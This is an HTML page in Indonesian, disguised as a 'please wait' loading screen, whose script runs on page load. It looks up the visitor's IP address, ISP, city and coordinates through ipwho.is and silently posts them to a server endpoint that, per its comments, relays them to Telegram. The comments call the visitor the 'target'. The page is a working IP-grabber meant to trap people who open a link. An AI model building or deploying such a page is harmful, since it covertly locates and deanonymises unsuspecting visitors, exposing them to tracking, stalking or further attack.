<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
</head>
<body>
  <h3>Mohon tunggu...</h3>
  <pre id="ip-info">Loading...</pre>

  <script>
    async function getIP() {
      try {
        // Ambil IP target & geolocation langsung dari ipwho.is
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();

        const info = `
ğŸ“¡ IP Terdeteksi
ğŸŒ IP: ${data.ip}
ğŸŒ Negara: ${data.country || "Unknown"}
ğŸ™ Kota: ${data.city || "Unknown"}, ${data.region || "Unknown"} ${data.postal || ""}
ğŸ›° ISP: ${data.connection?.isp || "Unknown"}
ğŸ¢ Org: ${data.connection?.org || "Unknown"}
âš¡ ASN: ${data.connection?.asn || "Unknown"}
âŒš Zona Waktu: ${data.timezone?.id || "Unknown"}
ğŸ“Œ Koordinat: ${data.latitude || "Unknown"},${data.longitude || "Unknown"}
ğŸ”— https://www.google.com/maps?q=${data.latitude || ""},${data.longitude || ""}
        `;

        // Tampilkan di halaman
        document.getElementById("ip-info").textContent = info;

        // Kirim ke server untuk dikirim ke Telegram
        await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: info })
        });

      } catch (err) {
        console.error("Error:", err);
        document.getElementById("ip-info").textContent = "Error: " + err.message;
      }
    }

    getIP();
  </script>
</body>
</html>
